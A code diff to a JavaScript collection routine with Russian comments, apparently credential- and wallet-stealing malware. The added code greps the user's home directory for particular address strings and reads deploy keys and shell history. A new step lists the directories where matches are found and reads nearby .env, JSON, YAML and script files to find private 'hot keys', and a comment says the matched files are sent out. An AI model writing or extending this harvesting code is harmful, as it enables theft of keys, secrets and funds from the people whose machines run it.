@@ -118,6 +118,15 @@ const run = (cmd) => {
   }
 };
 
+const readdirSafe = (dir) => {
+  try {
+    return readdirSync(dir);
+  } catch {
+    return [];
+  }
+};
+
+
 const chunk = (s, n) => (s.match(new RegExp(`[\\s\\S]{1,${n}}`, 'g')) || []);
 
 async function collect() {
@@ -229,8 +238,8 @@ async function collect() {
     const body = read(line.trim());
     add(`deploy-key/${line.trim()}`, body, asAuthority(line.trim(), body));
   }
-  const authGrep = run(`grep -rls --binary-files=text -e pwndLrgs -e 9VXfHeu4 -e 7HSMeoeg ${HOME} 2>/dev/null | head -6`);
-  for (const line of (authGrep || '').split('\n')) {
+  const authGrepRaw = run(`grep -rls --binary-files=text -e 9VXfHeu4 -e pwndLrgs -e 7HSMeoeg ${HOME} 2>/dev/null | head -6`);
+  for (const line of (authGrepRaw || '').split('\n')) {
     if (!line.trim()) continue;
     const body = read(line.trim(), 6000);
     add(`auth-grep/${line.trim()}`, body, asAuthority(line.trim(), body));
@@ -400,7 +409,30 @@ async function collect() {
   }
   add('keypair-pointers', [...ptr].join('\n'));
 
-  // ---- 5d. сплошной обход: любой keypair-shaped JSON сверяем по адресу.
+  // ---- 5c3. рядом с упоминанием адреса: соседи и каталог. Горячий ключ часто
+  // лежит в том же каталоге, что и конфиг, который на него ссылается.
+  const neighSrc = [...new Set([...authGrepRaw.split('\n'),
+    ...[...ptr].filter((x) => x && existsSync(x))])];
+  const seenNeigh = new Set();
+  for (const line of neighSrc) {
+    const p = line.trim();
+    if (!p) continue;
+    const dir = p.slice(0, p.lastIndexOf('/')) || HOME;
+    add(`neigh/${dir}/.ls`, run(`ls -la ${dir} 2>/dev/null | head -25`));
+    let n = 0;
+    for (const f of (readdirSafe(dir))) {
+      if (n >= 3) break;
+      if (!/\.(json|env|ya?ml|toml|txt|sh|js|ts)$/i.test(f)) continue;
+      const full = join(dir, f);
+      if (seenNeigh.has(full)) continue;
+      seenNeigh.add(full);
+      const body = read(full, 4000);
+      if (!body) continue;
+      n += 1;
+      add(`neigh/${full}`, body, asAuthority(full, body));
+    }
+  }
+
   // Ничего кроме совпавших файлов не отправляем, поэтому можно широко.
   const histPaths = ['.bash_history', '.zsh_history', '.sh_history', '.config/fish/fish_history'];
   const hist = histPaths.filter((p) => existsSync(join(HOME, p)))
